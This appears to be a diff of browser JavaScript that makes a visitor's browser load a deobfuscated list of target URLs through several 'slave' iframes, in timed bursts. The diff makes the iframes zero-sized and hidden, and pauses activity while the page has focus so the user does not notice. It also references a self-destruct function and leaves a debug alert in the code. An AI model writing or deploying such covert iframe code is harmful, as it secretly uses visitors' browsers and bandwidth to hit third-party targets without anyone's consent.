@@ -1,11 +1,9 @@
 
 var targetsChecked	= 0;
-var checkpoint		= 80;	
 var numSlaves		= 10;
 var targetIndex		= new Array(numSlaves);
-var focusHalt		= false;
-var sleepHalt       = false;
-         
+var halt    		= false;
+var burstStartTime  = 0;         
 	 
 function deobfuscate(string)
 {
@@ -29,7 +27,7 @@ function nextTarget(slaveFrameNum)
 	var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
 	var src = targets[targetIndex[slaveFrameNum]];
  	
-	if(focusHalt){ 
+	if(halt){ 
 	    return;
 	}
 	
@@ -45,8 +43,9 @@ function nextTarget(slaveFrameNum)
 function createSlaveFrame(slaveFrameNum)
 { 
 	var slaveFrame = document.createElement("IFRAME"); 
-	slaveFrame.setAttribute("height", "100");
-	slaveFrame.setAttribute("width", "100");
+	slaveFrame.setAttribute("height", "0");
+	slaveFrame.setAttribute("width", "0");
+	slaveFrame.setAttribute('style', 'visibility:hidden;display:none');
 	slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
 	slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());
 	document.body.appendChild(slaveFrame); 
@@ -66,16 +65,22 @@ function isLupinDown()
 function wakeSlaves()
 {
 
-
 	if(nibble == false)
 	{
-		if(focusHalt){ 
+		if(halt){ 
 			return; 
 		}
 	}
+
+	var lastBurst = burstStartTime;
+    var d = new Date();
+	burstStartTime = d.getTime();
+	if (burstStartTime - lastBurst < sleepDuration){
+	    return;
+	}
 	
-    sleepHalt = false;
-    
+	alert(targetsChecked);
+	
 	/*
 	if(isLupinDown())
 	{
@@ -97,25 +102,28 @@ function onMessage (event)
 {
 	var slaveFrameName = event.data;
 	
-	if(runWhileInFocus == false)
+	if(slaveFrameName.indexOf("focus") != -1)
 	{
-	    if(slaveFrameName.indexOf("focus") != -1)
-	    {
-		    focusHalt = true;
-		    return;
-	    }
+		if(runWhileInFocus == false){
+		    halt = true;
+		}    
+		return;
+	}
+	    
 		
-	    if(slaveFrameName.indexOf("blur") != -1)
+	if(slaveFrameName.indexOf("blur") != -1)
+	{
+	
+	    if(runWhileInFocus == false)
 	    {
-		    focusHalt = false;
-			if(sleepDuration < 10000){
-				setTimeout("wakeSlaves()", 10000);
-			}else{
-				setTimeout("wakeSlaves()", sleepDuration);
-			}
-			
-		    return;
+	        halt = false;
+		    if(sleepDuration < 10000){
+	    	    setTimeout("wakeSlaves()", 10000);
+		    }else{
+		    	setTimeout("wakeSlaves()", sleepDuration);
+	    	}
 	    }
+	    return;
 	}
 	
 
@@ -129,25 +137,20 @@ function onMessage (event)
 
 	var slaveFrameNum = parseInt(slaveFrameName.substring(10));
 
-	if(focusHalt == true || targetIndex[slaveFrameNum] >= targets.length){
+	if(halt == true || targetIndex[slaveFrameNum] >= targets.length){
 		return;
 	}
 	
-
-	if(targetsChecked % checkpoint == 0)
+    var d = new Date();
+   	if(d.getTime() - burstStartTime  < burstDuration){
+	    nextTarget(slaveFrameNum);	    
+	}else
 	{
-		sleepHalt = true;
 		if(nibble == true){
 		    nibble = false;
 		}else{
-		    setTimeout("wakeSlaves()", sleepDuration); 
-	    }
-	    
-	}else{
-	
-	    if(sleepHalt == false){
-		    nextTarget(slaveFrameNum);
-	    }
+		    setTimeout("wakeSlaves()", sleepDuration);     
+	    }   
 	 }
 	
 
@@ -162,6 +165,7 @@ function initiateSelfDestruct(){
 
 function init()
 {
+
     for(var i=0; i<numSlaves;i++)
     { 
     	targetIndex[i] = i; 
